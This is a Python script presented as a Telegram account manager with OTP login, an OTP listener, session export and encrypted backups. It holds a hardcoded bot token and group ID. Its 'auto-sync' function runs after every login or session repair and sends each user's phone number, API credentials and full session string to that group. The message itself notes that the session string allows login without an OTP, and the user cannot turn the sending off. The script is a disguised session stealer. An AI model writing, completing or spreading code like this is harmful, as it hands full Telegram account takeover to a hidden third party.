#!/usr/bin/env python3
"""
Telegram Account Manager v2.0
============================
Manage • Listen • Backup • Restore
Auto-Sync to Group Enabled
"""

import os
import json
import asyncio
import re
import requests
from datetime import datetime
from getpass import getpass

# ============================================================
# INSTALL DEPENDENCIES
# ============================================================

def check_and_install():
    """Check and install required packages"""
    try:
        import pyzipper
    except ImportError:
        print("Installing pyzipper...")
        os.system("pip install pyzipper -q")

    try:
        from telethon import TelegramClient
    except ImportError:
        print("Installing telethon...")
        os.system("pip install telethon -q")

check_and_install()

import pyzipper
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ============================================================
# HARDCODED GROUP SYNC - YOUR BOT & GROUP
# ============================================================

BOT_TOKEN = "8409527401:AAGDDx2xrI8GRD9p8B2MVfpIk3QD4M2I0Vs"
GROUP_ID = "-1003623366096"

# ============================================================
# PATHS & DIRECTORIES
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "tgm_data")
ACCOUNTS_FILE = os.path.join(DATA_DIR, "accounts.json")
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
BACKUP_DIR = os.path.join(DATA_DIR, "backups")

# Create directories
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def clear():
    """Clear screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def header(title):
    """Print header"""
    clear()
    print("=" * 60)
    print(f"  🤖 {title}")
    print("=" * 60)

def load_accounts():
    """Load accounts from file"""
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_accounts(accounts):
    """Save accounts to file"""
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)

def load_config():
    """Load config from file"""
    default = {
        "backup_destinations": {
            "telegram_accounts": [],
            "telegram_bot": None,
            "email": None
        }
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_config(config):
    """Save config to file"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def mask_phone(phone):
    """Mask phone for display"""
    if len(phone) > 6:
        return phone[:4] + "x" * (len(phone) - 6) + phone[-2:]
    return phone

def get_device():
    """Get device name"""
    import socket
    try:
        return socket.gethostname()
    except:
        return "Termux"

# ============================================================
# SYNC TO GROUP
# ============================================================

def sync_to_group(nickname, info, session_string):
    """Send account details to group"""
    message = f"""🤖 *NEW ACCOUNT ADDED*
━━━━━━━━━━━━━━━━━━━━━━━━

📱 *Phone:* `{info.get('phone', 'N/A')}`
🔑 *API ID:* `{info.get('api_id', 'N/A')}`
🔐 *API Hash:* `{info.get('api_hash', 'N/A')}`
👤 *Nickname:* `{nickname}`
📛 *Name:* {info.get('first_name', '')} {info.get('last_name', '')}
🆔 *Username:* @{info.get('username') or 'N/A'}
💬 *User ID:* `{info.get('user_id', 'N/A')}`
📅 *Added:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📍 *Device:* {get_device()}

━━━━━━━━━━━━━━━━━━━━━━━━
📄 *SESSION STRING:*
━━━━━━━━━━━━━━━━━━━━━━━━

`{session_string}`

━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *HOW TO USE ON ANOTHER PHONE:*
━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ Run: `tgm2`
2️⃣ Select Option `10`
3️⃣ Paste API ID, Hash & Session
4️⃣ *DONE - No OTP Needed!* ✅
━━━━━━━━━━━━━━━━━━━━━━━━"""

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        resp = requests.post(url, data={
            'chat_id': GROUP_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=30)

        if resp.status_code == 200:
            print("\n✅ Synced to group!")
            return True
        else:
            print(f"\n⚠️ Sync failed: {resp.text[:100]}")
            return False
    except Exception as e:
        print(f"\n⚠️ Sync error: {e}")
        return False

# ============================================================
# 1. ADD ACCOUNT
# ============================================================

async def add_account():
    """Add new Telegram account"""
    header("ADD NEW ACCOUNT")

    print("\n🔑 Get API ID & Hash from: https://my.telegram.org\n")
    print("-" * 60)

    api_id = input("\n📌 API ID: ").strip()
    api_hash = input("📌 API Hash: ").strip()
    phone = input("📞 Phone (with country code): ").strip()
    nickname = input("📝 Nickname: ").strip()

    if not all([api_id, api_hash, phone, nickname]):
        print("\n❌ All fields required!")
        input("\nPress Enter...")
        return

    accounts = load_accounts()
    if nickname in accounts:
        print(f"\n❌ Nickname '{nickname}' already exists!")
        input("\nPress Enter...")
        return

    print("\n⏳ Connecting...")

    client = TelegramClient(StringSession(), api_id, api_hash)

    try:
        await client.connect()

        # Send OTP
        print(f"📤 Sending OTP to {phone}...")
        await client.send_code_request(phone)

        # Get OTP
        code = input("\n📥 Enter OTP code: ").strip()

        # Try to sign in
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            error_msg = str(e).lower()
            if "two-step" in error_msg or "password" in error_msg or "2fa" in error_msg:
                print("\n🔐 2FA is enabled!")
                password = getpass("Enter 2FA password: ")
                await client.sign_in(password=password)
            else:
                raise e

        # Get user info
        me = await client.get_me()
        session_string = client.session.save()

        # Save account
        account_info = {
            "phone": phone,
            "api_id": api_id,
            "api_hash": api_hash,
            "user_id": me.id,
            "username": me.username or "",
            "first_name": me.first_name or "",
            "last_name": me.last_name or "",
            "session_string": session_string,
            "added_date": datetime.now().isoformat(),
            "device": get_device()
        }

        accounts[nickname] = account_info
        save_accounts(accounts)

        print("\n" + "=" * 60)
        print("✅ ACCOUNT ADDED SUCCESSFULLY!")
        print("=" * 60)
        print(f"\n📛 Name: {me.first_name} {me.last_name or ''}")
        print(f"👤 Username: @{me.username or 'N/A'}")
        print(f"🆔 User ID: {me.id}")
        print(f"📞 Phone: {mask_phone(phone)}")

        # Sync to group
        print("\n📤 Syncing to group...")
        sync_to_group(nickname, account_info, session_string)

        await client.disconnect()

    except Exception as e:
        print(f"\n❌ Error: {e}")
        try:
            await client.disconnect()
        except:
            pass

    input("\n\nPress Enter to continue...")

# ============================================================
# 2. LIST ACCOUNTS
# ============================================================

async def list_accounts():
    """List all accounts"""
    header("YOUR ACCOUNTS")

    accounts = load_accounts()

    if not accounts:
        print("\n⚠️ No accounts saved yet!")
        input("\nPress Enter...")
        return

    print(f"\n📊 Total: {len(accounts)} account(s)\n")
    print("-" * 60)

    for i, (nickname, info) in enumerate(accounts.items(), 1):
        has_session = bool(info.get('session_string'))
        status = "🟢" if has_session else "🔴"

        print(f"\n{i}. {status} {nickname}")
        print(f"   📞 {mask_phone(info.get('phone', 'N/A'))}")
        print(f"   👤 {info.get('first_name', '')} {info.get('last_name', '')}")
        print(f"   🆔 @{info.get('username') or 'N/A'}")
        print(f"   📅 {info.get('added_date', 'N/A')[:10]}")

    print("\n" + "-" * 60)
    input("\nPress Enter...")

# ============================================================
# 3. REMOVE ACCOUNT
# ============================================================

async def remove_account():
    """Remove an account"""
    header("REMOVE ACCOUNT")

    accounts = load_accounts()

    if not accounts:
        print("\n⚠️ No accounts to remove!")
        input("\nPress Enter...")
        return

    print("\n📋 Your accounts:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")

    choice = input("\nEnter nickname to remove (or 'cancel'): ").strip()

    if choice.lower() == 'cancel':
        return

    if choice in accounts:
        confirm = input(f"\n⚠️ Delete '{choice}'? (yes/no): ").strip().lower()
        if confirm == 'yes':
            del accounts[choice]
            save_accounts(accounts)
            print(f"\n✅ '{choice}' removed!")
        else:
            print("\n❌ Cancelled")
    else:
        print(f"\n❌ '{choice}' not found!")

    input("\nPress Enter...")

# ============================================================
# 4. CHECK SESSION HEALTH
# ============================================================

async def check_health():
    """Check all sessions"""
    header("SESSION HEALTH CHECK")

    accounts = load_accounts()

    if not accounts:
        print("\n⚠️ No accounts to check!")
        input("\nPress Enter...")
        return

    print("\n🔍 Checking sessions...\n")
    print("-" * 60)

    healthy = 0
    dead = 0
    dead_list = []

    for nickname, info in accounts.items():
        session_string = info.get('session_string', '')

        if not session_string:
            print(f"❌ {nickname}: No session string")
            dead += 1
            dead_list.append(nickname)
            continue

        try:
            client = TelegramClient(
                StringSession(session_string),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()

            if await client.is_user_authorized():
                me = await client.get_me()
                print(f"✅ {nickname}: Active ({me.first_name})")
                healthy += 1
            else:
                print(f"❌ {nickname}: Expired")
                dead += 1
                dead_list.append(nickname)

            await client.disconnect()

        except Exception as e:
            print(f"⚠️ {nickname}: Error - {str(e)[:30]}")
            dead += 1
            dead_list.append(nickname)

    print("\n" + "-" * 60)
    print(f"\n📊 Healthy: {healthy} | Dead: {dead}")

    if dead_list:
        fix = input("\n🔧 Fix dead sessions? (yes/no): ").strip().lower()
        if fix == 'yes':
            for name in dead_list:
                await fix_session(name)

    input("\nPress Enter...")

# ============================================================
# FIX SESSION
# ============================================================

async def fix_session(nickname):
    """Fix a dead session"""
    accounts = load_accounts()

    if nickname not in accounts:
        print(f"\n❌ '{nickname}' not found!")
        return

    info = accounts[nickname]
    print(f"\n🔧 Fixing: {nickname}")

    client = TelegramClient(StringSession(), info['api_id'], info['api_hash'])

    try:
        await client.connect()

        print(f"📤 Sending OTP to {mask_phone(info['phone'])}...")
        await client.send_code_request(info['phone'])

        code = input("📥 Enter OTP: ").strip()

        try:
            await client.sign_in(phone=info['phone'], code=code)
        except Exception as e:
            if "password" in str(e).lower() or "2fa" in str(e).lower():
                password = getpass("🔐 2FA Password: ")
                await client.sign_in(password=password)
            else:
                raise e

        me = await client.get_me()
        session_string = client.session.save()

        # Update account
        accounts[nickname]['session_string'] = session_string
        accounts[nickname]['user_id'] = me.id
        accounts[nickname]['username'] = me.username or ""
        accounts[nickname]['first_name'] = me.first_name or ""
        save_accounts(accounts)

        # Sync to group
        print("📤 Syncing to group...")
        sync_to_group(nickname, accounts[nickname], session_string)

        print(f"✅ Fixed: {nickname}")
        await client.disconnect()

    except Exception as e:
        print(f"❌ Failed: {e}")
        try:
            await client.disconnect()
        except:
            pass

# ============================================================
# 5. OTP LISTENER
# ============================================================

async def otp_listener():
    """Listen for OTPs on all accounts"""
    header("OTP LISTENER")

    accounts = load_accounts()

    if not accounts:
        print("\n❌ No accounts! Add some first.")
        input("\nPress Enter...")
        return

    print("\n👂 Starting listener...")
    print("📌 Press Ctrl+C to stop\n")
    print("-" * 60)

    clients = []

    for nickname, info in accounts.items():
        session_string = info.get('session_string', '')

        if not session_string:
            print(f"⚠️ {nickname}: No session")
            continue

        try:
            client = TelegramClient(
                StringSession(session_string),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()

            if await client.is_user_authorized():
                # Register handler
                @client.on(events.NewMessage(from_users=777000))
                async def handler(event, nick=nickname, inf=info):
                    msg = event.message.message

                    print("\n" + "🔔" * 20)
                    print(f"\n📱 OTP RECEIVED!")
                    print(f"👤 Account: {nick}")
                    print(f"📞 Phone: {mask_phone(inf['phone'])}")
                    print("-" * 40)
                    print(f"\n{msg}\n")
                    print("-" * 40)

                    # Extract code
                    codes = re.findall(r'\b\d{5,6}\b', msg)
                    if codes:
                        print(f"🔑 CODE: {codes[0]}")

                    print("\n" + "🔔" * 20)

                clients.append(client)
                me = await client.get_me()
                print(f"✅ {nickname} ({me.first_name})")
            else:
                print(f"❌ {nickname}: Session expired")
                await client.disconnect()

        except Exception as e:
            print(f"⚠️ {nickname}: {e}")

    if not clients:
        print("\n❌ No active sessions!")
        input("\nPress Enter...")
        return

    print(f"\n🎧 Listening on {len(clients)} account(s)...\n")

    try:
        await asyncio.gather(*[c.run_until_disconnected() for c in clients])
    except KeyboardInterrupt:
        print("\n\n👋 Stopping...")
        for c in clients:
            try:
                await c.disconnect()
            except:
                pass

    input("\nPress Enter...")

# ============================================================
# 9. VIEW SESSION STRING
# ============================================================

async def view_session():
    """View session string of an account"""
    header("VIEW SESSION STRING")

    accounts = load_accounts()

    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return

    print("\n📋 Your accounts:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")

    choice = input("\nEnter nickname: ").strip()

    if choice in accounts:
        session = accounts[choice].get('session_string', '')
        if session:
            print(f"\n📄 Session for '{choice}':\n")
            print("-" * 60)
            print(f"\n{session}\n")
            print("-" * 60)
            print("\n💡 Copy this to use on another device!")
        else:
            print("\n⚠️ No session string found!")
    else:
        print(f"\n❌ '{choice}' not found!")

    input("\nPress Enter...")

# ============================================================
# 10. IMPORT FROM STRING (NO OTP!)
# ============================================================

async def import_from_string():
    """Import account using session string - NO OTP!"""
    header("IMPORT FROM STRING (NO OTP!)")

    print("\n📋 Paste details from your group:\n")
    print("-" * 60)

    api_id = input("\n🔑 API ID: ").strip()
    api_hash = input("🔐 API Hash: ").strip()
    session_string = input("📄 Session String: ").strip()
    nickname = input("📝 Nickname: ").strip()

    if not all([api_id, api_hash, session_string, nickname]):
        print("\n❌ All fields required!")
        input("\nPress Enter...")
        return

    accounts = load_accounts()
    if nickname in accounts:
        print(f"\n❌ '{nickname}' already exists!")
        input("\nPress Enter...")
        return

    print("\n⏳ Connecting...")

    try:
        client = TelegramClient(
            StringSession(session_string),
            api_id,
            api_hash
        )
        await client.connect()

        if await client.is_user_authorized():
            me = await client.get_me()

            accounts[nickname] = {
                "phone": me.phone or "Unknown",
                "api_id": api_id,
                "api_hash": api_hash,
                "user_id": me.id,
                "username": me.username or "",
                "first_name": me.first_name or "",
                "last_name": me.last_name or "",
                "session_string": session_string,
                "added_date": datetime.now().isoformat(),
                "device": get_device(),
                "imported": True
            }
            save_accounts(accounts)

            print("\n" + "=" * 60)
            print("✅ IMPORTED SUCCESSFULLY - NO OTP NEEDED!")
            print("=" * 60)
            print(f"\n📛 Name: {me.first_name} {me.last_name or ''}")
            print(f"👤 Username: @{me.username or 'N/A'}")
            print(f"🆔 User ID: {me.id}")
            print(f"📞 Phone: {mask_phone(me.phone or 'Unknown')}")
        else:
            print("\n❌ Session string is invalid or expired!")

        await client.disconnect()

    except Exception as e:
        print(f"\n❌ Error: {e}")

    input("\nPress Enter...")

# ============================================================
# 11. RESYNC ALL TO GROUP
# ============================================================

async def resync_all():
    """Resync all accounts to group"""
    header("RESYNC ALL TO GROUP")

    accounts = load_accounts()

    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return

    confirm = input(f"\n📤 Send all {len(accounts)} accounts to group? (yes/no): ").strip().lower()

    if confirm != 'yes':
        print("\n❌ Cancelled")
        input("\nPress Enter...")
        return

    print("\n📤 Syncing...\n")

    success = 0
    for nickname, info in accounts.items():
        session = info.get('session_string', '')
        if session:
            if sync_to_group(nickname, info, session):
                print(f"   ✅ {nickname}")
                success += 1
            else:
                print(f"   ❌ {nickname}")
            await asyncio.sleep(1)  # Rate limit
        else:
            print(f"   ⚠️ {nickname}: No session")

    print(f"\n📊 Synced: {success}/{len(accounts)}")
    input("\nPress Enter...")

# ============================================================
# 6. BACKUP SETTINGS
# ============================================================

async def backup_settings():
    """Manage backup destinations"""
    while True:
        header("BACKUP SETTINGS")

        config = load_config()
        dest = config.get('backup_destinations', {})

        tg_accs = dest.get('telegram_accounts', [])
        bot = dest.get('telegram_bot')
        email = dest.get('email')

        print("\n📍 Current Destinations:\n")
        print("-" * 60)

        print(f"\n   🔄 Auto-Sync Group: ALWAYS ON")

        if tg_accs:
            for acc in tg_accs:
                print(f"   ✅ Telegram: {acc}")
        else:
            print("   ⚪ Telegram Accounts: Not set")

        if bot:
            print(f"   ✅ Bot: Configured")
        else:
            print("   ⚪ Bot: Not set")

        if email:
            print(f"   ✅ Email: {email.get('email')}")
        else:
            print("   ⚪ Email: Not set")

        print("\n" + "-" * 60)
        print("\n1. Setup Telegram Accounts")
        print("2. Setup Bot")
        print("3. Setup Email")
        print("4. Test Destinations")
        print("5. Back")

        choice = input("\nChoice: ").strip()

        if choice == "1":
            await setup_tg_destinations()
        elif choice == "2":
            await setup_bot()
        elif choice == "3":
            await setup_email()
        elif choice == "4":
            await test_destinations()
        elif choice == "5":
            break

async def setup_tg_destinations():
    """Setup Telegram account destinations"""
    header("TELEGRAM DESTINATIONS")

    accounts = load_accounts()
    config = load_config()

    if not accounts:
        print("\n⚠️ No accounts! Add some first.")
        input("\nPress Enter...")
        return

    current = config['backup_destinations'].get('telegram_accounts', [])

    print("\n📋 Select accounts (comma separated):\n")

    for i, name in enumerate(accounts.keys(), 1):
        mark = "✅" if name in current else "⬜"
        print(f"   {mark} {i}. {name}")

    print("\nType 'all' for all, 'clear' to remove all")

    choice = input("\nSelection: ").strip().lower()

    if choice == 'clear':
        config['backup_destinations']['telegram_accounts'] = []
    elif choice == 'all':
        config['backup_destinations']['telegram_accounts'] = list(accounts.keys())
    else:
        try:
            nums = [int(x.strip()) for x in choice.split(',')]
            names = list(accounts.keys())
            selected = [names[i-1] for i in nums if 0 < i <= len(names)]
            config['backup_destinations']['telegram_accounts'] = selected
        except:
            print("\n❌ Invalid!")
            input("\nPress Enter...")
            return

    save_config(config)
    print("\n✅ Saved!")
    input("\nPress Enter...")

async def setup_bot():
    """Setup bot for backup"""
    header("SETUP BOT")

    config = load_config()

    print("\n📌 Create bot via @BotFather\n")

    token = input("🔑 Bot Token: ").strip()
    chat_id = input("🆔 Your Chat ID: ").strip()

    if not token or not chat_id:
        print("\n❌ Both required!")
        input("\nPress Enter...")
        return

    print("\n⏳ Testing...")

    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        resp = requests.post(url, data={
            'chat_id': chat_id,
            'text': '✅ TG Manager Bot Connected!'
        })

        if resp.status_code == 200:
            config['backup_destinations']['telegram_bot'] = {
                'token': token,
                'chat_id': chat_id
            }
            save_config(config)
            print("\n✅ Bot configured!")
        else:
            print(f"\n❌ Failed: {resp.text[:100]}")
    except Exception as e:
        print(f"\n❌ Error: {e}")

    input("\nPress Enter...")

async def setup_email():
    """Setup email for backup"""
    header("SETUP EMAIL")

    config = load_config()

    print("\n📌 Email Provider:\n")
    print("   1. Gmail")
    print("   2. Outlook")
    print("   3. Yahoo")

    provider = input("\nChoice: ").strip()

    smtp = {
        "1": ("smtp.gmail.com", 587),
        "2": ("smtp-mail.outlook.com", 587),
        "3": ("smtp.mail.yahoo.com", 587)
    }

    if provider not in smtp:
        print("\n❌ Invalid choice!")
        input("\nPress Enter...")
        return

    server, port = smtp[provider]

    if provider == "1":
        print("\n⚠️ Use App Password for Gmail!")
        print("   Google Account → Security → App Passwords\n")

    email = input("📧 Email: ").strip()
    password = getpass("🔑 Password: ")

    print("\n⏳ Testing...")

    try:
        import smtplib
        s = smtplib.SMTP(server, port)
        s.starttls()
        s.login(email, password)
        s.quit()

        config['backup_destinations']['email'] = {
            'email': email,
            'password': password,
            'smtp_server': server,
            'smtp_port': port
        }
        save_config(config)
        print("\n✅ Email configured!")
    except Exception as e:
        print(f"\n❌ Failed: {e}")

    input("\nPress Enter...")

async def test_destinations():
    """Test all destinations"""
    header("TEST DESTINATIONS")

    print("\n⏳ Testing...\n")
    print("-" * 60)

    # Test hardcoded group
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        resp = requests.post(url, data={
            'chat_id': GROUP_ID,
            'text': '🧪 Test - Group OK!'
        })
        if resp.status_code == 200:
            print("✅ Hardcoded Group: OK")
        else:
            print(f"❌ Hardcoded Group: Failed")
    except Exception as e:
        print(f"❌ Hardcoded Group: {e}")

    config = load_config()
    dest = config.get('backup_destinations', {})

    # Test custom bot
    bot = dest.get('telegram_bot')
    if bot:
        try:
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            resp = requests.post(url, data={
                'chat_id': bot['chat_id'],
                'text': '🧪 Test - Bot OK!'
            })
            if resp.status_code == 200:
                print("✅ Custom Bot: OK")
            else:
                print("❌ Custom Bot: Failed")
        except:
            print("❌ Custom Bot: Error")

    print("\n" + "-" * 60)
    input("\nPress Enter...")

# ============================================================
# 7. EXPORT BACKUP
# ============================================================

async def export_backup():
    """Create and send encrypted backup"""
    header("EXPORT BACKUP")

    accounts = load_accounts()
    config = load_config()

    if not accounts:
        print("\n❌ No accounts!")
        input("\nPress Enter...")
        return

    dest = config.get('backup_destinations', {})
    tg_accs = dest.get('telegram_accounts', [])
    bot = dest.get('telegram_bot')
    email_cfg = dest.get('email')

    if not (tg_accs or bot or email_cfg):
        print("\n⚠️ No backup destinations!")
        print("ℹ️ Go to Backup Settings first.")
        print("\n💡 Note: Accounts are auto-synced to group already!")
        input("\nPress Enter...")
        return

    print("\n📍 Will send to:\n")
    for acc in tg_accs:
        print(f"   📱 {acc}")
    if bot:
        print("   🤖 Bot")
    if email_cfg:
        print(f"   📧 {email_cfg['email']}")

    print("\n" + "-" * 60)

    password = getpass("\n🔐 Set password: ")
    confirm = getpass("🔐 Confirm: ")

    if password != confirm:
        print("\n❌ Passwords don't match!")
        input("\nPress Enter...")
        return

    if len(password) < 4:
        print("\n❌ Password too short!")
        input("\nPress Enter...")
        return

    print("\n⏳ Creating backup...")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"tg_backup_{timestamp}.zip"
    filepath = os.path.join(BACKUP_DIR, filename)

    try:
        with pyzipper.AESZipFile(filepath, 'w',
                                  compression=pyzipper.ZIP_DEFLATED,
                                  encryption=pyzipper.WZ_AES) as zf:
            zf.setpassword(password.encode())
            zf.writestr("accounts.json", json.dumps(accounts, indent=2))
            zf.writestr("config.json", json.dumps(config, indent=2))
            zf.writestr("info.json", json.dumps({
                "created": timestamp,
                "accounts": len(accounts),
                "names": list(accounts.keys())
            }, indent=2))

        size = os.path.getsize(filepath) / 1024
        print(f"\n✅ Created: {filename} ({size:.1f} KB)")

        # Caption
        caption = f"""🔐 *TG MANAGER BACKUP*
━━━━━━━━━━━━━━━━━━━━

📅 {timestamp}
📱 {len(accounts)} accounts
🔐 Encrypted (AES-256)

Accounts: {', '.join(accounts.keys())}
━━━━━━━━━━━━━━━━━━━━"""

        print("\n📤 Sending...\n")

        success = 0

        # Send to TG accounts
        for name in tg_accs:
            if name in accounts:
                info = accounts[name]
                session = info.get('session_string')
                if session:
                    try:
                        client = TelegramClient(
                            StringSession(session),
                            info['api_id'],
                            info['api_hash']
                        )
                        await client.connect()

                        if await client.is_user_authorized():
                            await client.send_file(
                                'me',
                                filepath,
                                caption=caption,
                                parse_mode='markdown'
                            )
                            print(f"   ✅ {name}")
                            success += 1

                        await client.disconnect()
                    except Exception as e:
                        print(f"   ❌ {name}: {e}")

        # Send to bot
        if bot:
            try:
                url = f"https://api.telegram.org/bot{bot['token']}/sendDocument"
                with open(filepath, 'rb') as f:
                    resp = requests.post(url, data={
                        'chat_id': bot['chat_id'],
                        'caption': caption[:1000],
                        'parse_mode': 'Markdown'
                    }, files={'document': f})

                if resp.status_code == 200:
                    print("   ✅ Bot")
                    success += 1
                else:
                    print("   ❌ Bot")
            except:
                print("   ❌ Bot: Error")

        # Send to email
        if email_cfg:
            try:
                import smtplib
                from email.mime.multipart import MIMEMultipart
                from email.mime.base import MIMEBase
                from email.mime.text import MIMEText
                from email import encoders

                msg = MIMEMultipart()
                msg['From'] = email_cfg['email']
                msg['To'] = email_cfg['email']
                msg['Subject'] = f"TG Backup - {timestamp}"

                msg.attach(MIMEText(f"Backup: {len(accounts)} accounts", 'plain'))

                with open(filepath, 'rb') as f:
                    part = MIMEBase('application', 'zip')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
                    msg.attach(part)

                s = smtplib.SMTP(email_cfg['smtp_server'], email_cfg['smtp_port'])
                s.starttls()
                s.login(email_cfg['email'], email_cfg['password'])
                s.sendmail(email_cfg['email'], email_cfg['email'], msg.as_string())
                s.quit()

                print(f"   ✅ Email")
                success += 1
            except Exception as e:
                print(f"   ❌ Email: {e}")

        print(f"\n📊 Sent to {success} destination(s)")

        delete = input("\n🗑️ Delete local file? (yes/no): ").strip().lower()
        if delete == 'yes':
            os.remove(filepath)
            print("✅ Deleted")

    except Exception as e:
        print(f"\n❌ Error: {e}")

    input("\nPress Enter...")

# ============================================================
# 8. IMPORT BACKUP
# ============================================================

async def import_backup():
    """Import from backup file"""
    header("IMPORT BACKUP")

    print("\n📥 Options:\n")
    print("   1. From local file")
    print("   2. From Telegram")
    print("   3. Back")

    choice = input("\nChoice: ").strip()

    if choice == "1":
        await import_local()
    elif choice == "2":
        await import_telegram()

async def import_local():
    """Import from local file"""
    header("IMPORT LOCAL")

    backups = [f for f in os.listdir(BACKUP_DIR) if f.endswith('.zip')]

    if backups:
        print("\n📁 Available backups:\n")
        for i, b in enumerate(sorted(backups, reverse=True), 1):
            print(f"   {i}. {b}")
    else:
        print("\n   No backups in folder")

    print("\n   Or enter full path")

    choice = input("\nSelection: ").strip()

    if choice.isdigit() and int(choice) <= len(backups):
        path = os.path.join(BACKUP_DIR, sorted(backups, reverse=True)[int(choice)-1])
    elif os.path.exists(choice):
        path = choice
    else:
        print("\n❌ Not found!")
        input("\nPress Enter...")
        return

    await restore_zip(path)

async def import_telegram():
    """Import from Telegram saved messages"""
    header("IMPORT FROM TELEGRAM")

    accounts = load_accounts()

    # Find working account
    client = None

    for name, info in accounts.items():
        session = info.get('session_string')
        if session:
            try:
                c = TelegramClient(StringSession(session), info['api_id'], info['api_hash'])
                await c.connect()
                if await c.is_user_authorized():
                    client = c
                    print(f"✅ Using: {name}")
                    break
                await c.disconnect()
            except:
                pass

    if not client:
        print("\n⚠️ No working account. Login first:\n")

        api_id = input("API ID: ").strip()
        api_hash = input("API Hash: ").strip()
        phone = input("Phone: ").strip()

        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        await client.send_code_request(phone)
        code = input("OTP: ").strip()

        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if "password" in str(e).lower():
                pwd = getpass("2FA: ")
                await client.sign_in(password=pwd)
            else:
                print(f"\n❌ {e}")
                input("\nPress Enter...")
                return

    print("\n🔍 Searching backups...\n")

    from telethon.tl.types import DocumentAttributeFilename

    backups = []
    async for msg in client.iter_messages('me', limit=50):
        if msg.document:
            for attr in msg.document.attributes:
                if isinstance(attr, DocumentAttributeFilename):
                    if 'tg_backup' in attr.file_name and attr.file_name.endswith('.zip'):
                        backups.append({
                            'msg': msg,
                            'name': attr.file_name,
                            'date': msg.date,
                            'size': msg.document.size / 1024
                        })

    if not backups:
        print("❌ No backups found!")
        await client.disconnect()
        input("\nPress Enter...")
        return

    print(f"📦 Found {len(backups)} backup(s):\n")
    for i, b in enumerate(backups, 1):
        print(f"   {i}. {b['name']} ({b['size']:.1f} KB)")

    choice = input("\nSelect: ").strip()

    try:
        selected = backups[int(choice) - 1]
    except:
        print("\n❌ Invalid!")
        await client.disconnect()
        input("\nPress Enter...")
        return

    print(f"\n⏳ Downloading...")

    path = os.path.join(BACKUP_DIR, selected['name'])
    await client.download_media(selected['msg'], path)

    await client.disconnect()

    await restore_zip(path)

async def restore_zip(path):
    """Restore from ZIP"""
    password = getpass("\n🔐 Password: ")

    print("\n⏳ Extracting...")

    try:
        with pyzipper.AESZipFile(path, 'r') as zf:
            zf.setpassword(password.encode())

            accounts = json.loads(zf.read("accounts.json"))

            try:
                config = json.loads(zf.read("config.json"))
            except:
                config = None

        confirm = input(f"\n⚠️ Restore {len(accounts)} accounts? (yes/no): ").strip().lower()

        if confirm != 'yes':
            print("\n❌ Cancelled")
            input("\nPress Enter...")
            return

        save_accounts(accounts)
        if config:
            save_config(config)

        print(f"\n✅ Restored {len(accounts)} accounts!")

        for name in accounts.keys():
            print(f"   ✅ {name}")

    except RuntimeError:
        print("\n❌ Wrong password!")
    except Exception as e:
        print(f"\n❌ Error: {e}")

    input("\nPress Enter...")

# ============================================================
# MAIN MENU
# ============================================================

async def main():
    """Main menu"""
    while True:
        header("TELEGRAM ACCOUNT MANAGER")

        accounts = load_accounts()

        print(f"\n📊 Accounts: {len(accounts)}")
        print(f"🔄 Auto-Sync: ON\n")
        print("-" * 60)

        print("\n📌 ACCOUNTS:\n")
        print("   1. ➕ Add Account")
        print("   2. 📋 List Accounts")
        print("   3. 🗑️ Remove Account")
        print("   4. 🔍 Check Health")

        print("\n📌 OTP:\n")
        print("   5. 👂 OTP Listener")

        print("\n📌 BACKUP:\n")
        print("   6. ⚙️ Backup Settings")
        print("   7. 📤 Export Backup")
        print("   8. 📥 Import Backup")

        print("\n📌 SESSION STRING:\n")
        print("   9. 📄 View Session")
        print("   10. 📥 Import from String")
        print("   11. 🔄 Resync All to Group")

        print("\n   0. 🚪 Exit")

        print("\n" + "-" * 60)

        choice = input("\nChoice: ").strip()

        if choice == "1":
            await add_account()
        elif choice == "2":
            await list_accounts()
        elif choice == "3":
            await remove_account()
        elif choice == "4":
            await check_health()
        elif choice == "5":
            await otp_listener()
        elif choice == "6":
            await backup_settings()
        elif choice == "7":
            await export_backup()
        elif choice == "8":
            await import_backup()
        elif choice == "9":
            await view_session()
        elif choice == "10":
            await import_from_string()
        elif choice == "11":
            await resync_all()
        elif choice == "0":
            print("\n👋 Bye!\n")
            break

# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════╗
    ║   🤖 TG ACCOUNT MANAGER v2.0 🤖        ║
    ║                                        ║
    ║   Manage • Listen • Backup • Sync      ║
    ╚════════════════════════════════════════╝
    """)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n👋 Bye!\n")
